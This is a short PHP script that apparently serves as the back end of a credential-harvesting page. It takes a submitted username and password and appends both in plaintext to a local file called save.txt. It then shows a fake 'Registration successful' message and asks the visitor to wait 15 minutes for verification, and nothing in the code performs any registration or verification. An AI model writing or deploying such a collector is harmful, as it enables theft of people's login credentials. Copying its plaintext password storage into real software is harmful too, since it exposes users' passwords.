<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $username = $_POST["username"];
    $password = $_POST["password"];

    $data = "Username: " . $username . "\n";
    $data .= "Password: " . $password . "\n";
    $data .= "----------------------\n";

    file_put_contents("save.txt", $data, FILE_APPEND);

    echo "Registration successful!";
    echo "Wait 15min for verify your data";

    
} else {

    echo "Invalid request.";

}

?>
